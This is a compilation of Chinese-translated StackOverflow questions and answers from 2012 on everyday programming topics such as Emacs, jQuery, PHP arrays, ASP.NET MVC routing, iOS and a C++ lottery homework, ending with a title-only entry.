# StackOverflow 问答 10239000-10239999

# emacs - 如何使EMACS邪恶模式显示行号

> ID：10239005
> 
> 赞同：3
> 
> 时间：2012-04-20T01:20:24.587
> 
> 标签：emacs, evil-mode

我在 Emacs 下使用 evil-mode，所以我遇到了 Emacs 显示某些模式的行号但不显示其他模式的问题，当我尝试显式切换 linenumber-mode 时，它​​告诉我此模式已被禁用。

有没有办法让邪恶模式显示行号？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:48:27.397

`line-number-mode`默认情况下是启用的，而 Evil 似乎并没有改变它。

为了澄清，您肯定是在谈论在模式行中显示当前行号，而不是在边缘显示所有可见的行号（由 处理`linum-mode`）？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-04-06T15:05:16.897

试试`M-x`——`display-line-number-mode`

邪恶的 emacs 模式使用`:set nu`.

# javascript - 在 Selenium WebDriver 中执行 '.hover' Javascript

> ID：10239006
> 
> 赞同：1
> 
> 时间：2012-04-20T01:21:00.507
> 
> 标签：javascript, selenium, selenium-webdriver

我正在使用 Selenium WebDriver 并想从网页执行一些 javascript。我发现了一些关于执行 javascript 的（非常有用的）帖子并取得了一些成功，尽管当我必须从页面上的对象调用 javascript 时我似乎很挣扎（我是新手，所以我的术语和基本理解可能是离开？）。以下是我要调用的页面上的javascript：

```
$j(".webGrid tr").hover(function () {
        $j(this).find("#imgEdit").css("visibility", "visible");
} 
```

我目前觉得我最接近的两个尝试是：

```
js.ExecuteScript("('.itemId').find('#imgEdit').css('visibility', 'visible')"); //1
js.ExecuteScript("(arguments[0]).find('#imgEdit').css('visibility', 'visible')", element); //2 
```

谁能告诉我我哪里出错了？在第一种情况下，我得到一个*".itemId".find is not a function*而在第二个*arguments[0].find is not a function*中。我看到“查找”可能是问题所在，但它在页面 javascript 文件中，所以我的理解有误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T05:21:56.787

一个间接的答案，但为什么不直接使用 ActionBuilder 将鼠标悬停在一个元素上呢？

 ``Actions builder = new Actions(driver);

builder.moveToElement(someElement);` 

`builder.build().perform();`

更直接的答案... find 必须是 javascript 库中的函数，而不是默认情况下通过浏览器可用的函数。如果你要做这样的事情：

 ``return ((IJavaScriptExecutor)webDriverInstance).ExecuteScript("return arguments[0].innerHTML", elementInstance).ToString();` 它会起作用，因为 innerHTML 属性可从任何 javascript 元素对象中使用。``

# eclipse - 双拇指 SWT 秤

> ID：10239008
> 
> 赞同：0
> 
> 时间：2012-04-20T01:21:11.700
> 
> 标签：eclipse, swt

SWT 的**Scale**组件只支持一个拇指，我需要两个，以便显示一个值范围（即一个拇指是下限，另一个是上限）。

任何人都可以**a）**指出我的方向（商业或免费，谷歌没有帮助），或**b）**建议从头开始实施的最佳方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T04:27:47.993

为了回答我自己的问题，以防它在类似情况下使其他人受益：[Opal](http://code.google.com/a/eclipselabs.org/p/opal/)​​ 项目的[RangeSlider](http://code.google.com/a/eclipselabs.org/p/opal/wiki/RangeSlider)似乎提供了我所追求的功能。

# php - PHP递增多维数组

> ID：10239009
> 
> 赞同：0
> 
> 时间：2012-04-20T01:21:32.317
> 
> 标签：php, for-loop

从数组获取输出有一些问题。我环顾四周，似乎无法找出为什么我的数组没有为数组的每个部分分配索引。我环顾四周，甚至尝试向数组的一部分添加一个计数器变量，但这似乎并没有创建索引。我对 PHP 很陌生，所以任何人都可以给我的任何帮助将不胜感激。

```
foreach($dbh->query('SELECT n_productID, t_productName, t_categoryName FROM v_prodcatintersect') as $row) {
    $prodID=$row["n_productID"]; 
    $prodName=$row["t_productName"]; 
    $prodCategor=$row["t_categoryName"];
    $products=array(
        array(
            "prodID" => $prodID,
            "prodName" => $prodName,
            "prodCategor" => $prodCategor
        ),
    print_r($products);
}
for($i = 0, $size = sizeof($products); $i < $size; ++$i){
    echo "The product ID is ".$products[$i]["prodID"];
    echo " The product name is ".$products[$i]["prodName"];
    echo " Product Category ".$products[$i]["prodCategor"];
} 
```

现在数组（来自 print_r）的输出是“Array ([0] => Array ([prodID] => 1 [prodName] => iPhone 4 [prodCategor] => Smartphones)) Array ([0] = > 阵列（[prodID] => 2 [prodName] => Droid 3 [prodCategor] => 智能手机））”。并且回声仅打印两个项目中的第二个项目，因为它们都具有相同的索引。感谢您在此处创建索引的任何帮助。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:27:50.190

要将新项目添加到现有数组，可以使用以下语法：

```
$products[] = array(
                'prodID'   => $prodID,
                'prodName' => $prodName,
                'prodCategor' => $prodCategor); 
```

这将在现有数组的末尾追加一个新条目。因此，`$products`在 foreach 循环结束时将为您提供以下内容，而不仅仅是覆盖`$products`. 这允许您在第二个 for 循环中正确地递增 $products。

```
array(
  [0] => array(
           [prodID] => 1
           [prodName] => iPhone
           [prodCategor] => Smartphones)
  [1] => array(
           [prodID] => 2
           [prodName] => Droid
           [prodCategor] => Smartphones)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T01:30:04.680

尝试这样做 - [] 每次将子数组添加到多维数组时都会增加键索引。

```
$products[] = array(
  "prodID" => $prodID,
  "prodName" => $prodName,
  "prodCategor" => $prodCategor
) 
```

# php - 类图名称

> ID：10239011
> 
> 赞同：1
> 
> 时间：2012-04-20T01:22:01.843
> 
> 标签：php, xml, soap, wsdl

我正在尝试使用php内置soap客户端从XML响应中获取作为属性和元素对象的值。我试图用classmap解决这个问题，但仍然没有结果......

肥皂客户：

```
$client = new MySoapClient(null, array('trace' => 1, 'login' => $myusername, 'password' => $mypassword, 'location' => $location, 'uri' => "http://www.myuri.com/", 'soapVersion' => SOAP_1_1, 'use' => SOAP_LITERAL, 'style' => 'SOAP_DOCUMENT', 'soapaction' => $Operation, 'classmap' => array('AttributPrice' => 'MyAttributPriceClass')));

$ans = $client->__call("$Operation", array("_" => $MyParameter, "parameters2" => $MyVar), array('soapaction' => "$Operation", 'uri' => "http://www.myuri.com/$FileName")); 
```

XML 响应如下所示：ValueOfElement

我需要属性键、价格、净价格和收入的值以及元素的值。

我尝试使用类映射，但我得到的只是具有元素值的对象（我缺少属性的值）。类图实际上是如何工作的？WSDL 文件非常复杂且冗长。实际的问题是：classmap 的名称是什么？在 WSDL 文件中哪里可以找到它（客户端使用了许多 WSDL 和 XSD 文件）？如何确保自己使用正确的类映射名称？顺便说一句，我不想​​使用解析或类似的。

谢谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-21T03:51:18.333

注意`classmap`仅适用于 WSDL 模式。

实例化客户端后，执行 __getTypes()，如下所示：

```
$client = new MySoapClient(...);
$types = $client->__getTypes(); 
```

它将向您显示可用于映射到您的班级的类型列表。

如果确实，类型是`AttributPrice`，那么您可以：

```
$classMap = array('AttributPrice' => 'MyAttributPriceClass');
$client = new MySoapClient($wsdl, array('classmap' => $classMap)); 
```

# jquery - 限制容器内的可拖动元素

> ID：10239014
> 
> 赞同：2
> 
> 时间：2012-04-20T01:22:36.007
> 
> 标签：jquery, draggable, droppable

我在不使用 jquery ui 库的情况下制作了一个可拖动的 div，但我想制作可拖动的框，而不是离开它的容器。

这是我的[演示](http://jsfiddle.net/KdehU/)

```
$(document).ready(function() {
    var $dragging = null;

    $(document.body).on("mousemove", function(e) {
        if ($dragging) {
            $dragging.offset({
                top: e.pageY,
                left: e.pageX
            });
        }
    });

    $(document.body).on("mousedown", ".box", function (e) {
        $dragging = $(e.target);
    });

    $(document.body).on("mouseup", function (e) {
        $dragging = null;
    });
});​ 
```

这个怎么做？请注意，我没有使用**JQUERY UI**。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T02:07:47.473

只要确保...

*   盒子的左边位置大于容器的左边位置，并且
*   盒子的右边位置*（左边位置+盒子宽度）*小于容器的右边位置，并且
*   盒子的顶部位置大于容器的顶部位置，并且
*   盒子底部位置*（顶部位置+盒子高度）*小于容器底部位置

* * *

[http://jsfiddle.net/KdehU/2/](http://jsfiddle.net/KdehU/2/)

```
$(document).ready(function() {
    var $dragging = null;

    var container = $('#container'),
        c_t = container.offset().top,
        c_l = container.offset().left,
        c_b = c_t + container.height(),
        c_r = c_l + container.width();

    $(document.body).on("mousemove", function(e) {
        if ($dragging) {
            var width = $dragging.width();
            var height = $dragging.height();

            var new_y = (e.pageY > c_t && (e.pageY + height) < c_b) ? e.pageY : undefined;
            var new_x = (e.pageX > c_l && (e.pageX + width) < c_r) ? e.pageX : undefined;

            $dragging.offset({
                top: new_y,
                left: new_x
            });
        }
    });

    $(document.body).on("mousedown", ".box", function (e) {
        $dragging = $(e.target);
    });

    $(document.body).on("mouseup", function (e) {
        $dragging = null;
    });
}); 
```

# iphone - NSMutableDictionary 值查找

> ID：10239018
> 
> 赞同：0
> 
> 时间：2012-04-20T01:22:54.387
> 
> 标签：iphone, objective-c, ios, nsmutabledictionary

查看 NSMutableDictionary 以查看是否有对应于另一个变量的键的好方法是什么？

假设我有一个 NSString“测试”和一个可变字典，其中包含一些值和这些值的 NSString 键。

什么是阅读字典值以查看其任何键是否为“测试”的好方法。

我是否必须有一个 for 循环来读取字典值，或者是否已经有 NSDictionary 对象的一部分可以做到这一点，而我没有看到。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T01:25:49.580

您可以使用`keysOfEntriesPassingTest:`方法查找值等于的所有键`@"test"`。

在下面的实现中，只会找到第一个键。如果您需要对象所在的所有键`@"Test"`，请不要分配`*stop`。

```
NSString *target = @"test";
NSSet *keys = [myDictionary keysOfEntriesPassingTest:^(id key, id obj, BOOL *stop) {
    return (*stop = [target isEqual:obj]);
}]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T01:32:11.403

如果您想要的只是其键正是“测试”的那个，我认为您可以使用[objectForKey:](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/nsdictionary_Class/Reference/Reference.html#//apple_ref/occ/instm/NSDictionary/objectForKey%3a)来尝试获取相应的对象。如果键不存在，则返回的对象将为 nil。

# ios - 查看控制器内存分配和释放——正确的做法是什么

> ID：10239019
> 
> 赞同：-1
> 
> 时间：2012-04-20T01:22:56.037
> 
> 标签：ios

我今天想知道一件事。

假设我`MyViewController *myViewController`在根`UIViewController`接口中声明了一个属性并实现它（综合、释放、卸载等）

然后我有一个功能`loadMyView()`：

```
- (void)loadMyView {
    if (!self.myViewController)
        self.myViewController = [[MyViewController alloc] initWithNibName:@"MyViewController" bundle:nil];
    [self.view addSubview:self.myViewController.view];
} 
```

和：

```
- (void)hideMyView {
    [self.myViewController.view removeFromSuperview];
} 
```

这些功能可以多次使用。

问题是，一旦我隐藏了视图，我就不再需要它以及它的内容和它们的当前状态。那么从内存中删除它允许我稍后再次分配（从而省略方法中的`if`语句`loadMyView`）的正确方法是什么？为什么？

由于其他原因，我需要一个指向该对象的强指针，这就是为什么我不创建临时对象然后释放它的原因。

在`hideMyView`做我：

1.  `self.myViewController = nil;`
2.  `[self.myViewController release];`

或者 3\. 初始化时自动释放内存：（`self.myViewController = [[[MyViewController alloc] initWithNibName:@"MyViewController" bundle:nil]autorelease];`但是什么时候释放呢？）

对此还是比较陌生的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:13:47.217

您的问题令人困惑的是 loadview 是 UIViewController 类中的方法之一。重写第一个视图控制器的 loadview 方法以初始化第二个视图控制器并将第二个视图控制器的视图属性添加到第一个视图控制器的视图属性是没有意义的。我认为您的问题没有为任何人提供足够的背景来给您一个明智的答案。

# php - 有没有更好的方法在 PHP 中迭代这个多维数组？

> ID：10239021
> 
> 赞同：1
> 
> 时间：2012-04-20T01:23:32.057
> 
> 标签：php, arrays

我正在使用 Solr 搜索引擎。它返回我的搜索结果，如下所示：

```
array(2) {
  ["responseHeader"]=>
  array(3) {
    ["status"]=>
    int(0)
    ["QTime"]=>
    int(1)
    ["params"]=>
    array(5) {
      ["wt"]=>
      string(3) "php"
      ["start"]=>
      string(1) "0"
      ["q"]=>
      string(7) "monitor"
      ["version"]=>
      string(3) "2.2"
      ["rows"]=>
      string(2) "10"
    }
  }
  ["response"]=>
  array(3) {
    ["numFound"]=>
    int(2)
    ["start"]=>
    int(0)
    ["docs"]=>
    array(2) {
      [0]=>
      array(11) {
        ["id"]=>
        string(6) "VA902B"
        ["name"]=>
        string(49) "ViewSonic VA902B - flat panel display - TFT - 19""
        ["manu"]=>
        string(15) "ViewSonic Corp."
        ["weight"]=>
        float(190.4)
        ["price"]=>
        float(279.95)
        ["price_c"]=>
        string(10) "279.95,USD"
        ["popularity"]=>
        int(6)
        ["inStock"]=>
        bool(true)
        ["store"]=>
        string(18) "45.17614,-93.87341"
        ["cat"]=>
        array(2) {
          [0]=>
          string(11) "electronics"
          [1]=>
          string(7) "monitor"
        }
        ["features"]=>
        array(1) {
          [0]=>
          string(75) "19" TFT active matrix LCD, 8ms response time, 1280 x 1024 native resolution"
        }
      }
      [1]=>
      array(12) {
        ["id"]=>
        string(7) "3007WFP"
        ["name"]=>
        string(34) "Dell Widescreen UltraSharp 3007WFP"
        ["manu"]=>
        string(10) "Dell, Inc."
        ["includes"]=>
        string(9) "USB cable"
        ["weight"]=>
        float(401.6)
        ["price"]=>
        float(2199)
        ["price_c"]=>
        string(8) "2199,USD"
        ["popularity"]=>
        int(6)
        ["inStock"]=>
        bool(true)
        ["store"]=>
        string(18) "43.17614,-90.57341"
        ["cat"]=>
        array(2) {
          [0]=>
          string(11) "electronics"
          [1]=>
          string(7) "monitor"
        }
        ["features"]=>
        array(1) {
          [0]=>
          string(71) "30" TFT active matrix LCD, 2560 x 1600, .25mm dot pitch, 700:1 contrast"
        }
      }
    }
  }
} 
```

我在一个名为`$results`. 在我的页面上，我正在做一个 vardump 来获取每个结果集，如下所示：

```
foreach($results['response'] as $result) {
    if(is_array($result)) {
        foreach($result as $v) {
            var_dump($v);   
        }
    }
} 
```

这是它的输出：

```
array(11) {
  ["id"]=>
  string(6) "VA902B"
  ["name"]=>
  string(49) "ViewSonic VA902B - flat panel display - TFT - 19""
  ["manu"]=>
  string(15) "ViewSonic Corp."
  ["weight"]=>
  float(190.4)
  ["price"]=>
  float(279.95)
  ["price_c"]=>
  string(10) "279.95,USD"
  ["popularity"]=>
  int(6)
  ["inStock"]=>
  bool(true)
  ["store"]=>
  string(18) "45.17614,-93.87341"
  ["cat"]=>
  array(2) {
    [0]=>
    string(11) "electronics"
    [1]=>
    string(7) "monitor"
  }
  ["features"]=>
  array(1) {
    [0]=>
    string(75) "19" TFT active matrix LCD, 8ms response time, 1280 x 1024 native resolution"
  }
}

array(12) {
  ["id"]=>
  string(7) "3007WFP"
  ["name"]=>
  string(34) "Dell Widescreen UltraSharp 3007WFP"
  ["manu"]=>
  string(10) "Dell, Inc."
  ["includes"]=>
  string(9) "USB cable"
  ["weight"]=>
  float(401.6)
  ["price"]=>
  float(2199)
  ["price_c"]=>
  string(8) "2199,USD"
  ["popularity"]=>
  int(6)
  ["inStock"]=>
  bool(true)
  ["store"]=>
  string(18) "43.17614,-90.57341"
  ["cat"]=>
  array(2) {
    [0]=>
    string(11) "electronics"
    [1]=>
    string(7) "monitor"
  }
  ["features"]=>
  array(1) {
    [0]=>
    string(71) "30" TFT active matrix LCD, 2560 x 1600, .25mm dot pitch, 700:1 contrast"
  }
} 
```

这正是我所需要的，但我想知道是否有比我的“嵌套 foreach 循环和数组检查”方法更优雅的方法来获取它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:26:50.440

```
foreach ($results['response']['docs'] as $result) {
   ...
} 
```

# grails - 在 grails 中使用 HibernateCriteriaBuilder 从 createCriteria 中提取所有字段

> ID：10239022
> 
> 赞同：0
> 
> 时间：2012-04-20T01:23:46.043
> 
> 标签：grails, hibernate-criteria

我正在我的休眠中为数字字段的总和创建条件查询中的 group by 子句。我需要另一列 -`seriesType`来自输出结果列表中的域类，但现在如果我`property('seriesType')` 在预测中添加该术语以及 grouProperty() 行，我会得到一个异常说`not a group by clause could not execute query`

不确定如何在结果中获得该字段以及其他两个字段这是我的标准

```
dataMap = BehaviorProfile.createCriteria().list {
                    globalUser{
                        eq('id',empid2)
                    }

                    projections{
                       sum('frequency', 'tfreq')
                       groupProperty('dayofweek')
                    // if I add property('seriesType') here the criteria throws an exception
                    }

                } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T07:50:53.017

您需要添加`groupProperty('seriesType')`not `property('seriesType')`。当您按某个属性 A 分组并使用聚合函数（在您的情况下为 sum）时，您不能只在旁边输出一些其他属性 B，因为您的 B 预操作中也可以有很多值。

例如，在您的 dayofweek=2 聚合组中，总和为 150，并且存在三种可能的系列类型 - siereA、serieB 和 serieC。这就是为什么您需要：仅按 dayofweek 分组或将 group by seriesTypes 添加到您的查询中。

# jquery - jquery 简单的 ajax 加载而不加载其包装器 DIV

> ID：10239023
> 
> 赞同：2
> 
> 时间：2012-04-20T01:23:47.400
> 
> 标签：jquery

我在外部文件 (test.html) 中有一个内容 (#content) 以加载到 index.html 的另一个 DIV (#result) 中：

**测试.html：**

```
<div id="content">This text should not be loaded with its DIV. <strong> May contain other tags</strong></div> 
```

**jQuery：**

```
$('#result').load('test.html #content'); 
```

**index.html 结果，出乎意料：**

```
<div id="result"><div id="content">This text should not be loaded with its DIV. <strong> May contain other tags</strong></div></div> 
```

**index.html 结果，预期：**

```
<div id="result">This text should not be loaded with its DIV. <strong> May contain other tags</strong></div> 
```

你如何只加载#content 的实际内容/ HTML，它也可能包含其他标签，但只加载没有它的包装器 DIV (#content)？原因是为了简单地避免不必要的 div，它们也可能与其他样式的 DIV 错误地发生冲突。

非常感谢任何提示。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T01:38:53.587

如果您能够将 .load() 的结果转换为 var。你可以这样做。

```
var result = ... load line ...
var outResult = $(result);
// now strip the div out of outResult using jquery......
outResult = StripContentDiv(outResult);
$('#result').html(outResult); 
```

对不起，我不能更具体，因为我不是 jquery 专家。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T01:42:03.453

这是一个想法。如果您使用临时标签作为工作区怎么办？

这个 jQuery 的 javascript...

```
$('#workarea').load('test.html #content'); 
```

...可能会产生这个结果。请注意，工作区是隐藏的：

```
<div id="result"></div>
<div id="workarea" style="display: none"><div id="content>This text should not be loaded with its DIV</div></div> 
```

然后，您可以将其移至结果...

```
$('#result').html($('#workarea').html()); 
```

它应该产生这个结果。

```
<div id="result">This text should not be loaded with its DIV</div>
<div id="workarea" style="display: none"><div id="content></div></div> 
```

**编辑：**

这是一个完整的脚本：

```
$('#workarea').load('test.html #content');
$('#result').html($('#workarea').html()); 
```

您将使用这两行而不是您的一行。如果我理解正确，它应该会在上面的查询中产生预期的结果。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T02:00:35.867

是你看的吗

```
$(document).ready(function(){
  $('#result').load('test.html #content', function () {
    $('#content', this).text;
     });
   }); 
```

:P xD 由 JNE

# asp.net-mvc - ASP .Net MVC 路由：仅带有字符串 ID 的 URL

> ID：10239025
> 
> 赞同：10
> 
> 时间：2012-04-20T01:24:04.757
> 
> 标签：asp.net-mvc, url-routing

非常简单的问题，但我找不到答案：

*我的global.asax*中有默认`{controller}/{action}/{id}`模式。

 *我还需要一些东西会给我类似*www.example.com/microsoft*或*www.example.com/apple*而微软和苹果`id`存储在数据库中的东西。使用默认模式是：*www.example.com/brands/detail/microsoft*

知道模式应该是怎样的吗？我试过：`{id}`并将控制器和操作设置为`brands`，`detail`它可以满足我的需要，但会破坏所有其他模式。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T01:31:47.740

我会建议一个单独的路线，其约束条件是 id 要么不能匹配您的控制器之一，要么必须匹配数据库中的一个 id。将其列在默认路由之前，以便在满足条件时首先匹配。

使用简单正则表达式作为固定约束的示例，尽管您可能希望创建一个从 IRouteConstraint 派生的自定义约束，以动态限制值。

```
routes.MapRoute(
  "Brands",
  "{id}",
  new { controller = "brand", action = "detail" },
  new { id = "^(Microsoft)|(Apple)$" }
); 
```

您可能想查看[http://stephenwalther.com/blog/archive/2008/08/07/asp-net-mvc-tip-30-create-custom-route-constraints.aspx](http://stephenwalther.com/blog/archive/2008/08/07/asp-net-mvc-tip-30-create-custom-route-constraints.aspx)以获得更多想法。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-20T01:44:20.697

您的路线顺序很重要。因此，创建一个处理所有可用控制器的第一个路由定义，然后提及一个将处理其余请求的路由定义。在那里你将处理`www.yousite.com/apple`那种请求

```
routes.MapRoute("Default",  // Route name
                  "{controller}/{action}/{id}", // URL with parameters
                    new { controller = "Home", action = "Index", id = "" },
                    new { controller = new FromValuesListConstraint("Home", "Account","OtherOne") }
                );

 // to handle personalize user url
routes.MapRoute("user","{url}", new {controller="Home",action="Profile",url = "" }); 
```

现在创建一个`FromValuesListContraint`继承自 IRouteConstraint的新类

```
public class FromValuesListConstraint : IRouteConstraint
{
    private string[] _values;

    public FromValuesListConstraint(params string[] values)
    {
        this._values = values; 
    }

    public bool Match(HttpContextBase httpContext, Route route, string parameterName,
    RouteValueDictionary values, RouteDirection routeDirection)
    {
        // Get the value called "parameterName" from the
        // RouteValueDictionary called "value"

        string value = values[parameterName].ToString();

        // Return true is the list of allowed values contains
        // this value.

        for (int i = 0; i < _values.Length; i++)
            if (SContains(_values[i], value, StringComparison.OrdinalIgnoreCase ))
                return true;

        return false;
    }    

    public bool SContains(string source, string toCheck, StringComparison comp)
    {
        return source.IndexOf(toCheck, comp) >= 0;
    }
} 
```

让`Profile`Home 中的操作方法读取参数值并从数据库中获取数据。

```
 public ActionResult Profile(string url)
 {
    //url variable will have apple or microsoft . You may get data from db and return a view now.
 } 
```

因此，每当请求到来时，它将检查它是否是可用的控制器（您在第一个路由定义中传递给 FromValuesListContraint 类构造函数），如果可用，那么它将用于该路由，否则，它将用于一般（默认）路线作为第二条路线提及。

在这个例子中，Home、Account 和 OtherOnes 是我可用的控制器。每当您向项目添加新控制器时，您都希望将其添加到 FromValuesListConstraint 类构造函数的构造函数中。

简单地说它就像捕获一些特定异常并在没有捕获到一般异常时进入一般异常！:)（只是一个理解的例子）*

# javascript - 如何让 jQuery 对话框在显示之前等待？

> ID：10239027
> 
> 赞同：1
> 
> 时间：2012-04-20T01:24:23.937
> 
> 标签：javascript, jquery

我希望我的 jQuery 对话框在用户将鼠标悬停在图像上后正好显示 3 秒。目前我有：

```
$(".imgLi").live('hover', function() {
    showDialog();
});

function showDialog()
{
    $('#imageDialogDiv').dialog({
        modal:true
    });
}

<div id="imageDialogDiv" title="Blah">...</div> 
```

不确定时间代码或如何在此处实现 jQuery 的计时器对象。如果在 3 秒时间范围内的任何时候使用“鼠标移开”（将鼠标从图像上移开），我*不*希望显示对话框。在此先感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T01:27:39.753

抱歉，我在 mouseout 上添加了 cleartimeout，因此如果用户鼠标移开，它不应该执行

```
$(document).on('mouseenter', ".imgLi", function() {
    var t=setTimeout("showDialog()",3000);
}).on('mouseleave', ".imgLi", function() {
    clearTimeout(t);
});

function showDialog()
{
    $('#imageDialogDiv').dialog({
        modal:true
    });
}

<div id="imageDialogDiv" title="Blah">...</div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T01:35:03.183

```
$(".imgLi").live({
        mouseenter:
           function()
           {
              window.myTimeout = setTimeout(showDialog,3000);
           },
        mouseleave:
           function()
           {
              clearTimeout(window.myTimeout);
           }
       }
    );

function showDialog()
{
    $('#imageDialogDiv').dialog({
        modal:true
    });
} 
```

简单的jsfiddle：http: [//jsfiddle.net/weCpE/](http://jsfiddle.net/weCpE/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T01:35:03.617

您可以在悬停 3 秒后显示对话框，如果用户在 3 秒之前将鼠标移开，则不会使用此类代码显示。

我还迁移了要使用的代码，`.on()`因为`.live()`在所有版本的 jQuery 中都已弃用。您应该使用`document`更接近`".imgLi"`对象的静态父元素替换此代码以获得更好的性能。

```
var dialogTimer = null;
$(document).on('mouseenter', ".imgLi", function() {
    if (!dialogTimer) {
        dialogTimer = setTimeout(function() {
             dialogTimer = null;
             showDialog();
        }, 3000);
    }
}).on('mouseleave', ".imgLi", function() {
    if (dialogTimer) {
        clearTimeout(dialogTimer);
        dialogTimer = null;
    }
});

function showDialog()
{
    $('#imageDialogDiv').dialog({
        modal:true
    });
}

<div id="imageDialogDiv" title="Blah">...</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T02:10:04.380

我使用了来自 Brian Cherne 的[HoverIntent](http://cherne.net/brian/resources/jquery.hoverIntent.html)插件，效果非常好——您可以轻松地将其配置为您想要的确切延迟。我不认为它适用于`.live`（见[这个问题](https://stackoverflow.com/questions/4727099/adding-hoverintent-to-live-function)）。

# c++ - 匹配数字

> ID：10239028
> 
> 赞同：1
> 
> 时间：2012-04-20T01:24:37.040
> 
> 标签：c++

我正在尝试完成家庭作业，但我在任何地方都找不到。我正在尝试将输入数字与随机生成的数字相匹配，并显示 5 个数字中有多少是正确的（也带有赢/输消息）。这是我到目前为止所拥有的，任何帮助将不胜感激。

```
#include <iostream>
#include <cstdlib>
using namespace std;

void main()
{
    //variables
    int lottery[5], user[5];
    int count = 0;
    int num1, num2, num3, num4, num5;
    int winnum;
    //generating numbers
    for (int i=0; i <5; i++)
    {
        lottery[i] =1+rand()%9;
    }
    //input
    cout << "Enter a digit between 0-9: ";
    cin >> num1;
    // ...
    cin >> num5;

    winnum = rand();

    //display
    cout << "Winning Lottery Numbers: " << winnum << endl;
    cout << "Your ticket Numbers: " 
         << num1 << num2 << num3 << num4 << num5 << endl;

    //matching the numbers
    //HELP!
    system("pause");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T01:51:23.543

首先，只需输入元素，`user`而不是创建 5 个新变量。记下您找到多少匹配项（记得将其初始化为 0）。当用户输入每个号码时，您可以检查它是否与彩票号码匹配。如果是，请增加计数器。

其他几件事：

*   **永远**不要使用`void main()`. 使用`int main()`或`int main (int argc, char *argv[])`代替。操作系统希望你的程序返回一些东西，`int main()`如果没有指定返回值，则返回 0 (ERROR_SUCCESS) `main`。

*   在程序开始时调用`srand (time (NULL));`(include )。这会将种子设置为一个变化的值，以便每次运行程序时`<ctime>`生成的伪随机数都不相同。`rand`

*   我不太确定 num1-5 和 winnum 的意义是什么，当你有`user[5]`and时`lottery[5]`。

*   您可以替换`system ("PAUSE")`为

    `cin.sync();`
    `cin.get();`

    `cin.ignore()`这比暂停要好得多，并且没有`cin.get()`单独按 Enter 多少次的不一致。

*   如果这是作业的一部分，您必须验证没有两个彩票号码相同。

# assembly - 汇编器在哪里存储常量.data？以及它们是如何使用的？

> ID：10239029
> 
> 赞同：0
> 
> 时间：2012-04-20T01:24:39.693
> 
> 标签：assembly, mips

汇编器`somedata`在下面的代码中存储了什么？相对寻址？相对于什么？

```
.data 
somedata: .word 0xDEADBEEF

.code
lw $s0 somedata 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:43:34.470

`somedata`存储在数据段中，其起始地址可能因文件格式而异。相对寻址是I 型（分支）指令的[寻址方式。](http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/addr.html)相对寻址和数据声明没有任何关系。

# iphone - 在两个场景之间切换 iOS

> ID：10239035
> 
> 赞同：0
> 
> 时间：2012-04-20T01:25:33.170
> 
> 标签：iphone, objective-c, cocoa-touch, uiimageview, storyboard

这可能是不可能的，但我试图在场景转换之间保存我的应用程序的状态，但我不知道该怎么做。目前我喜欢这样的方式，当你有一个应用程序运行并点击主页按钮时，你可以回到你离开的那个应用程序，但是如果你在场景之间转换（在故事板中），一旦你回到那个场景应用程序状态未保存。

我只有两个不同的场景需要保存（你从一个到另一个来回转换）。如何在不占用精确内存的情况下保存故事板场景状态？

更详细：这是我的整个故事板。您可以使用加号工具栏按钮在场景之间来回切换。在第二个场景中，用户可以点击表格视图单元格，一个真实的图像将填充图像视图（见图 1.2）

![在此处输入图像描述](../Images/e10fb52afc69a8157b9d0b957ca5392a.png) 图 1.1

在图 1.2 中，您可以看到当您点击多个表格视图单元之一时会发生什么（弹出一个图像视图。）

![在此处输入图像描述](../Images/4ae584c93f0bba8e34ac8e28abdd7450.png) 图 1.2

问题：当您点击填充图像视图的表格视图单元格时（如图 1.2 所示），如果您停留在该场景甚至点击 iPhone 主页按钮（如果您点击 iPhone 主页按钮然后重新打开应用程序保存了场景的状态，并且填充了简单图像的图像视图仍然像我们离开它一样显示），但是如果我（使用加号按钮）转换回第一个场景，然后在第一个场景上使用加号按钮回到第二个场景，我创建的图像视图（如图 1.2 所示）消失了，第二个场景加载时没有保存我们填充的状态和图像视图。

编辑：我尝试对两个场景使用相同的视图控制器，但它没有解决问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:27:39.430

我同意 MDT。我相信将数据写入文件或数据库是一个很好的解决方案。我知道这是很多代码，但它是内存管理和用户体验最可靠的解决方案。请记住，用户体验是重中之重。如果他们无意中失去了在应用程序中的工作......他们可能会很快失去兴趣并卸载应用程序。这对所有人来说都是宽松的。祝你好运！

# emacs - Emacs hl-line：在本地更改颜色

> ID：10239037
> 
> 赞同：6
> 
> 时间：2012-04-20T01:25:45.583
> 
> 标签：emacs, line, text-cursor

